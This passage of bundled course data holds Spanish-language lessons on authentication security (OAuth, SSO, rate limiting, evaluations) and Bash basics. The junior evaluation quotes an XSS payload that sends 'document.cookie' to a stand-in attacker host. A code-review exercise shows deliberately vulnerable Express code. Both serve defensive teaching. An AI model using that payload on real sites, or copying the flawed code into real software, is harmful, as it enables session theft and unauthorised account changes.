1.  **Resource Owner:** El usuario.
2.  **Client:** Tu aplicacin.
3.  **Authorization Server:** El encargado de validar y emitir tokens (ej: Auth0, Keycloak, OKTA).
4.  **Resource Server:** Tu API que protege los datos.

## 4. Pregunta de Entrevista Senior:
*"Dime la diferencia entre un Access Token y un ID Token. Puedo usar un Access Token para identificar a un usuario en mi frontend?"*
**Respuesta Pro:** No. El ID Token es para el cliente (frontend) y contiene informacin del perfil del usuario. El Access Token es para el Resource Server (API) y contiene los permisos (scopes). Usar un Access Token para identidad es un fallo de seguridad comn.

---

### Escenario de Produccin:
Ests diseando un sistema donde tu web necesita leer los contactos de Google del usuario.
1.  Qu flujo de OAuth elegiras?
2.  Cmo manejaras el almacenamiento del \`client_secret\` en una aplicacin React (Pista: No se puede, necesitas un Backend for Frontend).
`,completed:!1},{id:"auth-security-18-sso-tokens-avanzados",title:"SSO (Single Sign-On) y Seguridad Avanzada en Tokens",level:"senior",content:`# Leccin 18: SSO (Single Sign-On) y Seguridad Avanzada en Tokens

El Single Sign-On (SSO) permite que un usuario se autentique una vez y acceda a mltiples aplicaciones independientes. Para un Arquitecto, esto implica manejar la confianza entre dominios.

## 1. Estrategias de Identidad Centralizada
*   **Central Authentication Service (CAS):** Un servidor nico que maneja todas las sesiones.
*   **SAML (Security Assertion Markup Language):** El estndar de la vieja escuela (basado en XML) usado principalmente en entornos corporativos (Active Directory).
*   **OIDC (Basado en JWT):** El estndar moderno para web y nube.

## 2. JWS, JWE y JWK (La familia JOSE)
Un Senior no solo habla de JWT, conoce los estndares que lo soportan:
*   **JWS (JSON Web Signature):** La estructura del token firmado que ya conocemos.
*   **JWE (JSON Web Encryption):** El token est **encriptado**, no solo firmado. Solo el destinatario con la llave privada puede ver el contenido. Vital para datos hiper-sensibles.
*   **JWK (JSON Web Key):** Un formato para compartir llaves pblicas. Permite que tus microservicios verifiquen tokens automticamente preguntando al servidor de identidad por sus llaves actuales.

## 3. Seguridad Crtica: Token Binding y DPoP
Un gran problema de los tokens es que son "Bearer Tokens" (quien lo tenga, tiene el poder).
*   **DPoP (Demonstrating Proof-of-Possession):** Un estndar nuevo que vincula el JWT a una llave criptogrfica privada que reside en el dispositivo del usuario. Si un hacker roba el token, no puede usarlo desde su mquina porque no tiene la llave vinculada.

## 4. Pregunta de Entrevista Senior:
*"Nuestra empresa tiene 10 microservicios. Cmo implementaras el Logout global? Si un usuario cierra sesin en una app, cmo invalidamos su acceso en las otras 9 instantneamente?"*
**Respuesta Pro:** Discutira el uso de **Back-channel Logout** (notificaciones entre servidores) vs **Front-channel Logout** (iframes ocultos) vs el uso de una **Blacklist distribuida en Redis** con propagacin de eventos.

---

### Desafo Tcnico:
Investiga qu es un **Sidecar de Seguridad** en una arquitectura de Kubernetes. Por qu es mejor que el microservicio verifique el token por s mismo?
`,completed:!1},{id:"auth-security-19-rate-limiting-resiliencia",title:"Rate Limiting de Produccin y Resiliencia",level:"senior",content:`# Leccin 19: Rate Limiting de Produccin y Resiliencia

Un sistema seguro en papel puede caerse en produccin bajo un ataque coordinado. El Arquitecto Senior disea para la guerra (alta carga y ataques).

## 1. Algoritmos de Rate Limiting
No todos los lmites son iguales:
*   **Fixed Window:** El ms simple. 100 peticiones por minuto. El problema: si mandan 100 en el segundo 59 y 100 en el segundo 61, el sistema recibe rfagas.
*   **Sliding Window Log/Counter:** Ms preciso para evitar rfagas, pero ms pesado en memoria.
*   **Token Bucket:** Permite rfagas cortas pero mantiene un promedio constante. Ideal para APIs que quieren ser "generosas" pero seguras.

## 2. Implementacin Distribuida
En una arquitectura multi-servidor, el rate limiting no puede ser local a cada instancia.
*   **Redis es el estndar:** Se usa un contador atmico en Redis para que todas las instancias del API compartan el mismo lmite por usuario/IP.

## 3. Web Application Firewall (WAF)
Como Senior, delegas la seguridad de red a herramientas especializadas.
*   **Cloudflare / AWS WAF:** Bloquean ataques de inyeccin, DDoS y bots antes de que toquen tu servidor.
*   **Proteccin de API Keys:** Si expones una API pblica, debes implementar cuotas, niveles de servicio (Tiering) y rotacin automtica de llaves.

## 4. Auditora y Monitoreo (SIEM)
No puedes reaccionar a lo que no ves.
*   **Logs Estructurados:** Los logs deben estar en formato JSON para que herramientas como ElasticStack (ELK) o Splunk puedan analizarlos en tiempo real.
*   **Alertas de Anomala:** Necesitas una alerta si la tasa de logins fallidos sube un 200% en 5 minutos. Eso no es un error de usuario, es un ataque de relleno de credenciales (Credential Stuffing).

---

### Caso Crtico Real:
Una plataforma de streaming fue atacada. El hacker us millones de combinaciones de usuarios/claves robadas de otra web. Como cada peticin vena de una IP diferente (proxy), el rate limiting por IP fall.
**Solucin Senior:** Implementar "Device Fingerprinting" y rate limiting por tasa de error global en el endpoint de login.

### Desafo Profesional:
Cmo implementaras un sistema que bloquee a un usuario pero solo para acciones de "Escritura" (POST/PUT/DELETE) mientras le permite seguir leyendo datos (GET) si sospechas de una actividad fraudulenta?
`,completed:!1},{id:"auth-security-20-errores-diseno-estrategia",title:"Errores de Diseo que Matan Corporaciones",level:"senior",content:`# Leccin 20: Errores de Diseo que Matan Corporaciones

En el nivel Senior, el error no es un bug de cdigo, es una falla de diseo arquitectnico. Analicemos las catstrofes reales para no repetirlas.

## 1. Almacenamiento Inseguro de Secretos
*   **Error:** Guardar la llave privada de firma de JWT o las API keys de servicios externos en el \`config.json\` o variables de entorno del servidor.
*   **Diseo Senior:** Uso de un **Secret Manager** (HashiCorp Vault, AWS Secrets Manager, Google Secret Manager). Las llaves se inyectan en tiempo de ejecucin y rotan automticamente.

## 2. Dependencia de Terceros sin Fallback
*   **Error:** Tu app solo permite login con Google. Google cae (ha pasado). Tu negocio muere por horas.
*   **Diseo Senior:** Estrategia de **Identidad Hbrida**. Siempre ofrece una forma de entrar propia o mltiples proveedores de identidad.

## 3. Falta de "Defense in Depth" (Defensa en profundidad)
Confiaste en que el firewall bloqueaba todo y no hasheaste las claves con mucha fuerza. El firewall fall y el atacante entr a una zona "confiable".
*   **Principio Senior:** Asume que cada capa de tu cebolla de seguridad puede fallar. Si el hacker llega a la DB, las claves deben ser intiles (Hashing fuerte + Pepper en HSM). Si roba un token, debe ser intil fuera de la red (DPoP).

## 4. El peligro de la "Seguridad por Oscuridad"
*   **Error:** Pensar que porque tu API no est documentada, nadie la encontrar.
*   **Realidad:** Existen herramientas de escaneo automtico que mapean todas tus rutas en segundos. Disea siempre asumiendo que el atacante conoce el 100% de tu cdigo.

## 5. El error del "Token de Admin" eterno
*   **Error:** Tener tokens de sistema para tareas automticas que no expiran nunca. Su robo es una sentencia de muerte para la infraestructura.
*   **Diseo Senior:** Tokens de acceso de muy corta vida para servicios, renovados mediante identidades de mquina (Workload Identity).

---

### Pregunta de Entrevista Final:
*"Si tuvieras que elegir entre invertir $50,000 en mejorar el sistema de hashing de contraseas o en implementar un WAF de ltima generacin, sobre qu base tomaras la decisin?"*
**Respuesta Senior:** Evaluando el **Modelo de Amenazas**. Nuestra mayor amenaza es la filtracin de datos persistentes (DB) o la denegacin de servicio y el scraping (Red)? Un Senior decide basndose en Riesgo vs Costo vs Impacto.

---

### Misin Final Senior:
Realiza un **Audit de Seguridad** de tu proyecto actual. No busques solo "si la clave es fuerte". Busca:
1. Cmo se rotan las llaves?
2. Qu pasa si el servidor de identidad no responde?
3. Cmo detectamos un comportamiento anmalo que no sea fuerza bruta?

Felicidades, Arquitecto! Has completado el camino de la seguridad. 
`,completed:!1},{id:"auth-security-ejercicios-senior",title:"Desafos de Arquitectura de Seguridad",level:"senior",content:`# Ejercicios Senior: Desafos de Arquitectura de Seguridad

En este nivel los ejercicios no son de cdigo, son de diseo y toma de decisiones crticas.

---

## Desafo 1: El Dilema del Banco Global
**Contexto:** Un banco est migrando de una aplicacin monoltica a microservicios. Tienen 50 aplicaciones diferentes (web y mobile).
**Consigna:**
1. Propn una arquitectura de **SSO** que permita al usuario moverse entre todas las apps.
2. Explica cmo manejaras la **Propagacin de Identidad** entre un microservicio A y un microservicio B si el servicio B necesita saber qu usuario origin la peticin.
3. Propn una estrategia para **invalidar una sesin** en los 50 servicios si se detecta un fraude en tiempo real.

---

## Desafo 2: Resiliencia ante Ataques de Relleno (Credential Stuffing)
**Contexto:** Tu sitio recibe 1 milln de intentos de login por hora, todos probando combinaciones de emails y claves robadas de otros sitios. El rate limiting por IP no funciona porque usan redes botnet.
**Consigna:**
*   Disea un sistema de deteccin basado en "Heursticas". Qu datos miraras para decidir si bloqueas una peticin sin afectar a usuarios reales? (Pista: Headers de navegador, velocidad de escritura, tasa de error por cuenta).

---

## Desafo 3: El Almacn de Secretos
**Contexto:** Tu equipo guarda las llaves de AWS y la DB en un archivo \`.env\` que por error fue subido a un Repositorio Privado de GitHub.
**Consigna:**
1. Cul es el protocolo de emergencia inmediato para mitigar el riesgo?
2. Disea la solucin definitiva para que los desarrolladores no necesiten ver las llaves reales en su entorno local pero la app pueda funcionar.

---

## Desafo 4: Auditora Forense
**Contexto:** Se detect que un administrador "fantasma" borr registros de auditora el mes pasado. No hay rastro de quin fue.
**Consigna:**
*   Cmo redisearas tu sistema de logs para que sean **Inmutables**? (Es decir, que ni siquiera un administrador con acceso total pueda borrarlos o editarlos sin dejar rastro).

---

Arquitecto, presenta tus soluciones! Recuerda que en seguridad no existe el "100% seguro", solo el "suficientemente difcil para el atacante". 
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-junior",title:"Autenticacin y Seguridad (Junior)",level:"junior",content:`# Evaluacin Tcnica: Autenticacin y Seguridad (Junior)

Esta evaluacin mide tu comprensin de los pilares de la seguridad web y tu capacidad para evitar errores de principiante en la gestin de usuarios.

---

## 1. Parte Terica: Conceptos Fundamentales
1.  **AuthN vs AuthZ:** Ests diseando un foro. El sistema verifica que eres "Pedro" mediante tu contrasea. Luego, intentas borrar un post que escribi "Mara" y el sistema te lo impide. Explica en qu momento ocurri la **Autenticacin** y en qu momento la **Autorizacin**.
2.  **Hashing:** Por qu usamos un **Salt** al hashear una contrasea? Qu pasara si dos usuarios eligen la misma contrasea "123456" y no usamos Salt?

## 2. Ejercicio Prctico: El Flujo del Secreto
Describe paso a paso (en una lista o pseudocdigo) qu debe hacer tu servidor de backend cuando recibe una peticin de **Login** con un email y una contrasea.
*   *Restriccin:* Menciona explcitamente qu funcin de la base de datos usas y qu funcin de la librera de seguridad usas.

## 3. Desafo Real: El Bug de XSS
Un atacante publica un comentario en tu sitio web que dice: \`<script>fetch('https://malvado.com/steal?c=' + document.cookie)<\/script>\`.
1.  Si tu sitio guarda el identificador de sesin en una cookie normal, qu acaba de pasar?
2.  Cmo arreglas este problema desde el servidor (menciona el flag de la cookie)?

## 4. Anlisis de Caso: UX vs Seguridad
Recibes un reporte de que el mensaje de error de tu App dice: *"Usuario no encontrado en la base de datos"*.
1.  Por qu esto es una vulnerabilidad?
2.  Propn el mensaje de error definitivo que sea seguro pero til para el usuario.

---

## Criterios de Aprobacin
*   **Identificacin (40%):** Diferencia sin errores Autenticacin de Autorizacin.
*   **Implementacin (30%):** Describe el flujo de hashing y comparacin correctamente.
*   **Mitigacin (30%):** Identifica el riesgo de XSS y propone el uso de cookies HttpOnly.

*Nota: Para aprobar, no debes haber sugerido en ningn momento guardar contraseas en texto plano o en LocalStorage.* 
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-semi-senior",title:"Autenticacin y Seguridad (Semi-Senior)",level:"semi-senior",content:`# Evaluacin Tcnica: Autenticacin y Seguridad (Semi-Senior)

Como desarrollador con experiencia, se espera que disees sistemas resistentes a ataques automatizados y manejes sesiones de forma profesional.

---

## 1. Parte Terica: Sesiones Escalables
1.  **Refresh Tokens:** Explica el concepto de **Rotacin de Refresh Tokens (RTR)**. Cmo ayuda esto a detectar si un token ha sido robado por un atacante?
2.  **CORS:** Por qu \`Access-Control-Allow-Origin: *\` es una mala prctica en una API que maneja autenticacin por cookies?

## 2. Ejercicio Prctico: Review de Cdigo
Analiza este fragmento de cdigo (Node.js/Express) y encuentra al menos **2 errores de seguridad**:

\`\`\`javascript
app.put('/api/user/update', async (req, res) => {
  const { id, ...data } = req.body;
  // El usuario logueado en la sesin es req.user.id
  await User.update(data, { where: { id: id } }); 
  res.send({ message: 'Perfil actualizado' });
});
\`\`\`
*Consigna:* Explica el riesgo de cada error y escribe la versin corregida.

## 3. Desafo Real: El Logout Global
Un usuario reporta que le robaron el celular donde tena abierta la sesin de tu App.
1.  Si usas **JWT (Stateless)**, cmo invalidas ese token inmediatamente antes de que expire?
2.  Propn una arquitectura usando **Redis** para manejar una "Blacklist" de tokens revocados.

## 4. Diseo de Permisos (RBAC)
Disea el esquema lgica para un sistema de **Google Drive** simple.
*   Roles: \`Owner\`, \`Editor\`, \`Viewer\`.
*   Cmo validaras que un usuario que intenta borrar un archivo es efectivamente el \`Owner\`? (Menciona la validacin a nivel de objeto).

---

## Criterios de Aprobacin
*   **Seguridad de API (30%):** Identifica vulnerabilidades de BOLA (Broken Object Level Auth) y Mass Assignment.
*   **Manejo de Tokens (40%):** Disea flujos de renovacin y revocacin de tokens.
*   **Autorizacin (30%):** Propone un sistema de permisos jerrquico y validacin de propiedad de recursos.

*Nota: Se valorar la capacidad de proponer soluciones que contemplen el uso de Redis o bases de datos para estados de sesin.* 
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-senior",title:"Arquitectura de Seguridad (Senior)",level:"senior",content:`# Evaluacin Tcnica: Arquitectura de Seguridad (Senior)

Esta evaluacin se centra en la estrategia, el cumplimiento de estndares internacionales y la resiliencia sistmica.

---

## 1. Parte Terica: Protocolos de Identidad
1.  **OIDC vs OAuth 2.0:** Tu empresa quiere implementar un sistema de "Login con LinkedIn". Qu protocolo se encarga de darte el nombre y email del usuario y cul se encarga de darte permiso para publicar en su muro?
2.  **PKCE:** Por qu el flujo de OAuth 2.0 "Implicit Flow" est obsoleto y por qu PKCE es la solucin tcnica para SPAs?

## 2. Ejercicio de Diseo: El Sistema de Microservicios
Tienes 10 microservicios. Un usuario se loguea en el \`Auth-Service\`.
1.  Cmo propagas la identidad del usuario a los otros 9 servicios de forma segura y performante?
2.  Cmo manejas la **Rotacin de Llaves Pblicas (JWKS)** para que los servicios puedan verificar tokens sin preguntar al servidor de Auth en cada peticin?

## 3. Desafo Real: Ataque de Credential Stuffing
Tu plataforma de e-commerce est bajo un ataque coordinado: 5,000 bots estn probando contraseas robadas de otros sitios contra tu DB.
1.  El Rate Limiting por IP falla porque usan proxies. Qu otras mtricas usaras para detectar el ataque?
2.  Cmo implementaras un sistema de **Adaptive Auth** (ej: pedir 2FA solo si el login parece sospechoso)?

## 4. Estrategia y tica: La Vulnerabilidad 0-Day
Ves un error de diseo en el CORE de tu sistema de autenticacin que permitira entrar a cualquier cuenta de administrador. El plazo de lanzamiento es en 2 horas. El CEO dice que "lancemos igual y lo fijamos despus".
1.  Cul es tu defensa tcnica y tica ante esta situacin?
2.  Cmo documentaras el riesgo en un reporte de arquitectura formal?

---

## Criterios de Aprobacin Senior
*   **Dominio de Estndares (40%):** Conoce a fondo OAuth 2.0, OIDC y las especificaciones de seguridad de tokens.
*   **Resiliencia Sistmica (30%):** Disea sistemas que fallan de forma segura (Fail-safe) y escalan.
*   **Liderazgo Tcnico (30%):** Capacidad de priorizar la seguridad sobre la velocidad de entrega y justificar decisiones ante stakeholders.

*Misin: El sistema no debe ser solo seguro, debe ser auditable, monitoreable y resiliente.* 
`,completed:!1,isProject:!0}]},Yb={id:"bash",title:"Bash y Terminal Scripting",description:"Domina la lnea de comandos de Linux y Unix para automatizar tareas, gestionar servidores y potenciar tu productividad como desarrollador.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"bash-01-intro-bash",title:"Qu es Bash y por qu la Terminal es tu mejor amiga?",level:"junior",content:`# Leccin 01: Qu es Bash y por qu la Terminal es tu mejor amiga?

Si quieres ser un desarrollador de lite, no puedes depender de hacer clic en botones. La Terminal (o consola) es donde ocurre la verdadera magia.

## 1. Qu es Bash?
**Bash** (Bourne Again SHell) es un lenguaje de comandos y un programa que interpreta lo que escribes para que la computadora lo ejecute. Es el estndar en Linux y macOS, y se usa en casi todos los servidores del mundo.

## 2. El Prompt: Tu punto de entrada
Cuando ves algo como \`user@computer:~$\`, la computadora te est diciendo: "Estoy lista, qu quieres hacer?".
*   \`~\`: Significa que ests en tu carpeta personal (Home).
*   \`$\`: Significa que eres un usuario normal. Si vieras \`#\`, seras el administrador (Root), ten cuidado!

## 3. Por qu aprenderlo?
*   **Velocidad:** Hacer tareas repetitivas en segundos.
*   **Servidores:** La mayora de los servidores no tienen una interfaz visual (ventanas), solo una terminal.
*   **Automatizacin:** Escribir un pequeo script que haga una tarea pesada por ti.

---

### Concepto Junior:
La terminal no es algo de "hackers" de las pelculas. Es simplemente otra herramienta para hablar con tu computadora de forma directa y potente.

### Ejercicio Mental 1:
Si tienes que renombrar 100 fotos de "vacaciones_1.jpg" a "foto_1.jpg", qu tardara ms: hacerlo a mano con el ratn o escribir una sola lnea de comando?
`,completed:!1},{id:"bash-02-navegacion-archivos",title:"Navegacin y Gestin de Archivos",level:"junior",content:"# Leccin 02: Navegacin y Gestin de Archivos\n\nPara moverte en Bash, necesitas tres comandos bsicos que usars 1,000 veces al da.\n\n## 1. Dnde estoy? (`pwd`)\n`pwd` (Print Working Directory): Te dice la ruta exacta de la carpeta donde ests parado.\n\n## 2. Qu hay aqu? (`ls`)\n`ls` (List): Te muestra los archivos y carpetas.\n*   `ls -l`: Muestra detalles (tamao, fecha).\n*   `ls -a`: Muestra archivos ocultos (los que empiezan con punto, como `.env`).\n\n## 3. Cmo me muevo? (`cd`)\n`cd` (Change Directory):\n*   `cd carpeta`: Entras a una carpeta.\n*   `cd ..`: Subes un nivel (vuelves atrs).\n*   `cd ~`: Vuelves a tu casa (Home).\n\n## 4. Crear y Borrar\n*   `mkdir nombre`: Crea una carpeta.\n*   `touch archivo.txt`: Crea un archivo vaco.\n*   `rm archivo.txt`: Borra un archivo (**Ojo!** No hay papelera de reciclaje, se borra para siempre).\n*   `cp`: Copia archivos.\n*   `mv`: Mueve o renombra archivos.\n\n---\n\n### Misin Junior:\nAprender a moverte por las carpetas de tu proyecto usando solo la terminal. Te har sentir mucho ms gil mientras programas.\n\n### Ejercicio Prctico 2:\nCrea una carpeta llamada `prueba`, entra en ella, crea un archivo llamado `hola.txt` y luego intenta borrar la carpeta un nivel arriba. (Pista: para borrar carpetas con contenido se usa `rm -rf`).\n",completed:!1},{id:"bash-03-pipes-redireccion",title:"El poder de las Tuberas (Pipes) y Redireccin",level:"junior",content:'# Leccin 03: El poder de las Tuberas (Pipes) y Redireccin\n\nEn Bash, los comandos no estn solos; pueden trabajar en equipo. Esta es la filosofa de Unix: "Haz una sola cosa y hazla bien, y permite que se conecte con otros".\n\n## 1. Redireccin de salida (`>`)\nPor defecto, los comandos muestran el resultado en la pantalla. Con `>` puedes enviarlo a un archivo.\n*   `ls > lista.txt`: Crea un archivo con el contenido de la carpeta.\n*   **Ojo:** `>` borra el archivo y escribe de nuevo. Si quieres agregar al final sin borrar, usa `>>`.\n\n## 2. Las Tuberas (`|`)\nEs el concepto ms potente de Bash. Toma la salida de un comando y la usa como entrada del siguiente.\n*   **Ejemplo:** `ls | grep "config"`\n    *   `ls` lista los archivos.\n    *   `|` se los pasa a `grep`.\n    *   `grep` filtra y solo muestra los que tienen la palabra "config".\n\n## 3. Ver contenido de archivos\n*   `cat`: Muestra todo el archivo de golpe.\n*   `head`: Muestra las primeras 10 lneas.\n*   `tail`: Muestra las ltimas 10 lneas (muy til para ver logs).\n*   `less`: Permite navegar por el archivo sin cargarlo todo en memoria.\n\n---\n\n### Concepto Junior:\nCombinar comandos pequeos te permite hacer bsquedas complejas. Imagina buscar un error especfico en un archivo de texto de 1 milln de lneas en un segundo. Con `grep` y `|`, es fcil.\n\n### Ejercicio Mental 3:\nSi tienes un archivo `logs.txt` y solo quieres ver las ltimas 5 lneas que contengan la palabra "ERROR", cmo combinaras los comandos que aprendiste?\n',completed:!1},{id:"bash-04-primer-script",title:"Tu primer Script (.sh)",level:"junior",content:`# Leccin 04: Tu primer Script (.sh)

Un script es simplemente un archivo de texto que contiene una lista de comandos que Bash ejecutar uno tras otro.

## 1. El Shebang (\`#!\`)
La primera lnea de cualquier script de Bash debe ser siempre:
\`\`\`bash
#!/bin/bash
\`\`\`
Esto le dice a la computadora: "Usa el programa Bash para leer este archivo".

## 2. Creando el script
1. Crea un archivo: \`touch miscript.sh\`.
2. Escribe adentro:
\`\`\`bash
#!/bin/bash
echo "Hola, estoy limpiando el proyecto..."
rm -rf tmp/*.log
echo "Limpieza terminada!"
\`\`\`

## 3. Permisos de ejecucin
Por seguridad, los archivos nuevos no se pueden ejecutar como programas. Tienes que darles permiso:
*   \`chmod +x miscript.sh\`

## 4. Correr el script
Ahora puedes correrlo escribiendo:
*   \`./miscript.sh\`

---

### Misin Junior:
Automatizar una tarea que haces siempre. Por ejemplo, crear la estructura de carpetas de un proyecto nuevo con un solo comando.

### Ejercicio Prctico 4:
Crea un script llamado \`saludo.sh\` que imprima tu nombre, el nombre de la carpeta donde ests (\`pwd\`) y la fecha actual (\`date\`). No olvides el Shebang y el \`chmod +x\`.
`,completed:!1},{id:"bash-05-practica-junior",title:"Bash Junior",level:"junior",content:`# Ejercicios y Evaluacin: Bash Junior

Demuestra que dominas la terminal antes de pasar a la automatizacin avanzada.

---

## 1. Ejercicio: El Inspector de Archivos
**Escenario:** Tienes una carpeta con mil archivos. Necesitas saber cuntos de ellos son archivos de configuracin (\`.conf\`).
*Consigna:* Qu comando usaras combinando \`ls\`, \`grep\` y \`wc -l\` (que cuenta lneas)?

## 2. Ejercicio: El Limpiador Automtico
**Escenario:** Siempre que terminas de trabajar, borras manualmente la carpeta \`temp\` y creas una nueva vaca para maana.
*Consigna:* Escribe las 3 lneas de cdigo de un script que haga esto por ti.

## 3. Evaluacin: Conceptos Base
*   Qu diferencia hay entre \`>\` y \`>>\` al redireccionar una salida a un archivo?
*   Para qu sirve el comando \`chmod +x\`?
*   Qu es el "Shebang" y en qu lnea del script debe ir?

---

### Criterios de Aprobacin
* [ ] Se mueve por carpetas sin usar el ratn.
* [ ] Entiende el flujo de datos entre comandos (Pipes).
* [ ] Puede crear y ejecutar scripts bsicos.

Felicidades! Has dejado de ser un usuario para empezar a ser un administrador de tu entorno. 
`,completed:!1,isProject:!0},{id:"bash-06-variables-argumentos",title:"Variables y Argumentos en Bash",level:"semi-senior",content:`# Leccin 06: Variables y Argumentos en Bash

Como Semi-Senior, tus scripts deben ser inteligentes y adaptarse a diferentes situaciones. Para eso necesitamos guardar datos.

## 1. Definir Variables
En Bash **no dejes espacios** alrededor del \`=\`.
*   **Bien:** \`NOMBRE="Octavio"\`
*   **Mal:** \`NOMBRE = "Octavio"\`

Para usar la variable, ponemos \`$\` adelante: \`echo "Hola $NOMBRE"\`.

## 2. Argumentos de entrada
Puedes pasarle datos a un script cuando lo ejecutas: \`./script.sh arg1 arg2\`.
*   \`$1\`: El primer argumento.
*   \`$2\`: El segundo argumento.
*   \`$@\`: Todos los argumentos juntos.
*   \`$#\`: Cuntos argumentos se pasaron.

## 3. Capturar la salida de un comando
Si quieres guardar lo que devuelve un comando en una variable, usa \`$()\`:
\`\`\`bash
FECHA=$(date)
echo "Hoy es $FECHA"
\`\`\`

---

### Lo que hace un Semi-Senior:
No escribe rutas fsicas fijas (Hardcoded). Usa variables para que el script funcione correctamente si cambias de carpeta o de computadora.

### Ejercicio 6:
Crea un script que reciba un nombre como argumento y cree una carpeta con ese nombre, luego entre en ella y cree un \`index.html\`. 
Ejemplo: \`./crear-sitio.sh mi-web\`
`,completed:!1},{id:"bash-07-condiciones-loops",title:"Lgica - Condiciones y Bucles",level:"semi-senior",content:`# Leccin 07: Lgica - Condiciones y Bucles

Un script profesional debe poder tomar decisiones: "Si el archivo existe, haz esto; si no, haz aquello".

## 1. Condicionales (\`if\`)
La sintaxis de Bash es un poco especial con los espacios en los corchetes \`[ ]\`.
\`\`\`bash
if [ "$1" == "admin" ]; then
    echo "Hola Jefe"
else
    echo "Acceso Denegado"
fi
\`\`\`
*   \`-f archivo\`: Existe el archivo?
*   \`-d carpeta\`: Existe la carpeta?

## 2. Bucles (\`for\`)
Ideal para procesar muchos archivos a la vez.
\`\`\`bash
for ARCHIVO in *.jpg; do
    echo "Procesando $ARCHIVO..."
    mv "$ARCHIVO" "backup_$ARCHIVO"
done
\`\`\`

## 3. Cdigos de Salida (Exit Codes)
Cada comando que ejecutas le dice a Bash si termin bien o mal.
*   \`0\`: Todo sali bien.
*   Cualquier otro nmero: Hubo un error.
T puedes forzar esto en tus scripts con \`exit 0\` o \`exit 1\`.

---

### Misin Semi-Senior:
Automatizar tareas de mantenimiento. Por ejemplo, un script que busque todos los archivos \`.tmp\` y los borre, pero solo si tienen ms de 7 das de antigedad.

### Ejercicio 7:
Escribe un script que recorra todos los archivos \`.sh\` de la carpeta actual y les de permisos de ejecucin automticamente usando un \`for\`.
`,completed:!1},{id:"bash-08-funciones-automatizacion",title:"Funciones y Automatizacin Real",level:"semi-senior",content:`# Leccin 08: Funciones y Automatizacin Real

Para que tus scripts no sean fideos de cdigo ilegibles, usamos funciones, igual que en JavaScript.

## 1. Definir Funciones
\`\`\`bash
imprimir_error() {
    echo "[ERROR] $1"
    exit 1
}

# Uso:
if [ -z "$1" ]; then
    imprimir_error "Debes pasar un argumento"
fi
\`\`\`

## 2. Automatizacin en el mundo real
Como Semi-Senior, ya no haces scripts solo para borrar archivos. Los usas para:
*   **Backup automtico:** Un script que comprima una carpeta y la suba a un servidor.
*   **Instalador inicial:** Un script que instale todas las herramientas (Node, Git, Docker) cuando llega un programador nuevo.
*   **Monitoreo:** Un script que revise si un sitio web est cado y enve una notificacin.

## 3. El archivo .bashrc (o .zshrc)
No todos los scripts tienen que vivir en archivos sueltos. Puedes crear **Alias** (atajos) en tu configuracin personal.
*   \`alias up="git add . && git commit -m 'update' && git push"\`
Ahora solo escribes \`up\` en la terminal y hace todo eso por ti.

---

### Verdad Semi-Senior:
"No gastes 2 horas automatizando una tarea que tardas 10 segundos en hacer a mano... a menos que esa tarea la tengas que hacer todos los das por el resto de tu vida".

### Ejercicio Prctico 8:
Crea un script que comprima la carpeta \`logs\` en un archivo \`.tar.gz\` (puedes buscar cmo usar el comando \`tar\`) y le ponga la fecha actual al nombre del archivo.
`,completed:!1},{id:"bash-09-practica-semi-senior",title:"Bash Semi-Senior",level:"semi-senior",content:"# Ejercicios y Evaluacin: Bash Semi-Senior\n\nDemuestra que puedes programar la terminal para que trabaje por ti.\n\n---\n\n## 1. Ejercicio: El Validador de Backups\n**Escenario:** Tienes un script que hace backups. Necesitas que antes de empezar, verifique que la carpeta `destino` exista.\n*Consigna:* Escribe el fragmento de `if` que verifique si la carpeta existe y, si no existe, la cree usando `mkdir`.\n\n## 2. Ejercicio: El Renombrador Masivo\n**Escenario:** Tienes una carpeta con 50 archivos `.txt`. Quieres que todos pasen a llamarse `.md`.\n*Consigna:* Escribe un bucle `for` que haga este cambio de extensin para todos los archivos.\n\n## 3. Evaluacin: Lgica de Scripting\n*   Qu diferencia hay entre `$@` y `$#`?\n*   Cmo guardas el resultado del comando `whoami` en una variable llamada `USUARIO`?\n*   Explica qu significa que un comando devuelva un exit code de `0` vs `1`.\n\n---\n\n### Resultado esperado:\nScripts que no solo funcionen, sino que sean elegantes, manejen errores y sean fciles de leer para otros compaeros. \n",completed:!1,isProject:!0},{id:"bash-10-scripts-robustos",title:"Scripts Robustos y Manejo de Errores",level:"senior",content:'# Leccin 10: Scripts Robustos y Manejo de Errores\n\nEn produccin, un script de Bash no puede fallar silenciosamente. Como Senior, diseas scripts que son predecibles y seguros.\n\n## 1. El modo "Seguro" de Bash\nAl principio de tus scripts, usa siempre:\n```bash\nset -euo pipefail\n```\n*   `-e`: El script se detiene inmediatamente si un comando falla.\n*   `-u`: Falla si intentas usar una variable no definida.\n*   `-o pipefail`: Si una tubera (`|`) falla en el medio, todo el comando falla.\n\n## 2. Captura de Errores con `trap`\n`trap` permite ejecutar una funcin justo antes de que el script termine o si ocurre un error inesperado (limpieza de archivos temporales, logs de error).\n```bash\ncleanup() {\n  echo "Limpiando archivos antes de salir..."\n}\ntrap cleanup EXIT\n```\n\n## 3. Manejo de Errores Manual\nUsa el cdigo de salida (`$?`) para tomar decisiones crticas.\n```bash\ncp archivo.txt /backup/ || { echo "Error al copiar"; exit 1; }\n```\n\n---\n\n### Visin Senior:\nUn script robusto comprueba que todas las herramientas necesarias (`docker`, `git`, `npm`) estn instaladas antes de empezar a trabajar. Usa `command -v <comando>` para esto.\n',completed:!1},{id:"bash-10-sed-awk-ninja",title:"Procesamiento de Texto Ninja - Sed y Awk",level:"senior",content:`# Leccin 10: Procesamiento de Texto Ninja - Sed y Awk

En el nivel Senior, no solo mueves archivos; transformas datos masivos sin abrir un editor de texto. Para eso existen dos herramientas legendarias.

## 1. Sed: El Editor de Flujo
Sirve para buscar y reemplazar texto en archivos gigantes de forma instantnea.
*   **Comando:** \`sed -i 's/viejo/nuevo/g' archivo.txt\`
    *   \`-i\`: Modifica el archivo real (in-place).
    *   \`s\`: Sustituir.
    *   \`g\`: Global (todas las veces que aparezca).

## 2. Awk: El Procesador de Columnas
Awk es casi un lenguaje de programacin por s solo. Es imbatible para procesar archivos CSV o Logs con columnas.
*   **Ejemplo:** \`awk '{print $1, $3}' logs.txt\`
    *   Muestra solo la primera y la tercera columna de cada lnea de un archivo.

## 3. Combinando el Arsenal
\`cat data.csv | awk -F',' '{print $2}' | sed 's/"//g' | sort | uniq\`
1. Leemos el archivo.
2. Sacamos la segunda columna (separada por comas).
3. Quitamos las comillas.
